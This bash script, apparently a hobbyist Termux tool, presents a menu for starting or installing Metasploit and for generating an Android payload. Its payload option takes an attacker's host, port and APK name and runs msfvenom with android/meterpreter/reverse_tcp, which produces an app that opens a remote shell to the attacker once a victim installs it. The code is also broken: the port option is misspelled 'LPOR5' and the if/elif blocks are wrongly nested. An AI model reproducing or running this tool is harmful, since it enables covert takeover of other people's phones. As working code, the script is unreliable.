#!/bin/bash
# MetasploitPayloadGenarater v1.0
# Coded by: NullHACKR
# Github: https://github.com/NullHACKR/metasploit
# This tools is only for Termux
clear
echo
echo " ------------------------------------------------"
echo -e "\e[1;91m INSTALLING REQUIREMENTS"
apt install figlet
pip install lolcat
echo -e "\e[1;97m ------------------------------------------------"
echo -e "\e[1;92m "
figlet metadata | lolcat
echo -e "\e[1;91mONLY \e[1;97mFOR \e[1;92mTERMUX"
echo
echo
echo -e "\e[1;97m1.\e[1;91mstart metasploit\e[1;97m-\e[1;92mframework"
echo -e "\e[1;97m2.\e[1;91mcreate\e[1;92m payload"
echo -e "\e[1;97m3.\e[1;91minstall \e[1;97mmetasploit\e[1;92m framework"
echo -e "\e[1;97m4.\e[1;91mexit\e[1;92m --- "
echo -e "\e[1;97m "
read -p " >  :" option
if [[ $option == 2 ]]; then
 echo
 echo
 echo -e "\e[1;97m(+) \e[1;91menter lhost"
 read lhost
 echo
 echo
 echo -e "\e[1;97m(+) \e[1;91menter lport"
 read lport
 echo
 echo
 echo -e "\e[1;97m(+) \e[1;91menter apk name with apk extension "
 read apk
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPOR5=$lport R > /sdcard/$apk
 read -p " Do you want to start metasploit-framework y/n :" start
 if [[ $start == y ]]; then
 msfconsole
 elif [[ $start == n ]]; then
 bash metasploit.sh
elif [[ $option == 1 ]]; then
echo " Starting Metasploit Framework "
msfconsole
bash metasploit.sh
elif [[ $option == 4 ]]; then
echo -e "\e[1;91m "
figlet exit
exit
elif [[ $option == 3 ]]; then
pkg update && pkg upgrade -y && pkg install wget curl openssh git -y
pkg install unstable-repo
echo -e "\e[1;91minstalling metasploit-framework"
pkg install metasploit
else
echo -e "\e[1;91mInvalid options"
clear
bash metasploit.sh
fi
